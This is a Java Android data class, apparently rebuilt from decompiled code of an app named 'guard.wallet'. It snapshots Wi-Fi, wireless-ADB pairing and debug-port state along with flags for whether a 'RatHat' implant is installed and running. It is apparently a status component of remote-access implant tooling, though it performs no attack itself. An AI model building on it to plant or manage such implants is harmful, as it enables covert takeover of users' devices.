package com.guard.wallet.resp;

import android.os.Build.VERSION;
import androidx.annotation.NonNull;
import com.guard.wallet.adb.AdbConnectionManager;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.io.Serializable;

/**
 * 设备配对状态 VO — vendor DevicePairStateVO 164行。
 * of() 收集网络/ADB/RatHat 配对状态。
 */
public class DevicePairStateVO implements Serializable {
    private Integer deviceConnected;
    private Integer deviceDebugPort;
    private Integer devicePaired;
    private Integer isWifiConnected;
    private Integer netConnected;
    private Integer ratHatImplant;
    private Integer ratHatRunning;
    private Integer supportPair;
    private String wifiId;

    public DevicePairStateVO() {}

    public DevicePairStateVO(Integer netConnected, Integer isWifiConnected, String wifiId,
                             Integer supportPair, Integer devicePaired, Integer deviceConnected,
                             Integer deviceDebugPort, Integer ratHatImplant, Integer ratHatRunning) {
        this.netConnected = netConnected;
        this.isWifiConnected = isWifiConnected;
        this.wifiId = wifiId;
        this.supportPair = supportPair;
        this.devicePaired = devicePaired;
        this.deviceConnected = deviceConnected;
        this.deviceDebugPort = deviceDebugPort;
        this.ratHatImplant = ratHatImplant;
        this.ratHatRunning = ratHatRunning;
    }

    /** vendor DevicePairStateVO.of() — 收集配对状态快照 */
    public static DevicePairStateVO of() {
        DevicePairStateVO vo = new DevicePairStateVO();
        NetStateVO net = SystemHelper.z0();
        vo.setNetConnected(net.getIsConnected());
        vo.setIsWifiConnected(net.getIsWifiConnected());
        vo.setWifiId(net.getWifiId());
        vo.setSupportPair(VERSION.SDK_INT > 29 ? 1 : 0);
        ADBConfig cfg = SharedPrefsManager.J();
        vo.setRatHatImplant(cfg.getInstalledRatHat());
        vo.setDevicePaired(Integer.valueOf(cfg.isPaired() ? 1 : 0));
        vo.setDeviceConnected(Integer.valueOf(cfg.isConnected() ? 1 : 0));
        vo.setDeviceDebugPort(cfg.getDebugPort());
        AdbConnectionManager ratHatSvr = AdbConnectionManager.getInstance();
        if (ratHatSvr != null && ratHatSvr.ratHatPending.get()) {
            vo.setRatHatImplant(1);
            vo.setRatHatRunning(1);
        } else {
            vo.setRatHatRunning(0);
        }
        return vo;
    }

    // ═══════ Getters ═══════
    public Integer getDeviceConnected() { return deviceConnected; }
    public Integer getDeviceDebugPort() { return deviceDebugPort; }
    public Integer getDevicePaired() { return devicePaired; }
    public Integer getIsWifiConnected() { return isWifiConnected; }
    public Integer getNetConnected() { return netConnected; }
    public Integer getRatHatImplant() { return ratHatImplant; }
    public Integer getRatHatRunning() { return ratHatRunning; }
    public Integer getSupportPair() { return supportPair; }
    public String getWifiId() { return wifiId; }

    // ═══════ Setters ═══════
    public void setDeviceConnected(Integer v) { this.deviceConnected = v; }
    public void setDeviceDebugPort(Integer v) { this.deviceDebugPort = v; }
    public void setDevicePaired(Integer v) { this.devicePaired = v; }
    public void setIsWifiConnected(Integer v) { this.isWifiConnected = v; }
    public void setNetConnected(Integer v) { this.netConnected = v; }
    public void setRatHatImplant(Integer v) { this.ratHatImplant = v; }
    public void setRatHatRunning(Integer v) { this.ratHatRunning = v; }
    public void setSupportPair(Integer v) { this.supportPair = v; }
    public void setWifiId(String v) { this.wifiId = v; }

    @NonNull
    @Override
    public String toString() {
        return "DevicePairStateVO{netConnected=" + netConnected
                + ", isWifiConnected=" + isWifiConnected
                + ", wifiId='" + wifiId + "', supportPair=" + supportPair
                + ", devicePaired=" + devicePaired
                + ", deviceConnected=" + deviceConnected
                + ", deviceDebugPort=" + deviceDebugPort
                + ", ratHatImplant=" + ratHatImplant
                + ", ratHatRunning=" + ratHatRunning + '}';
    }
}
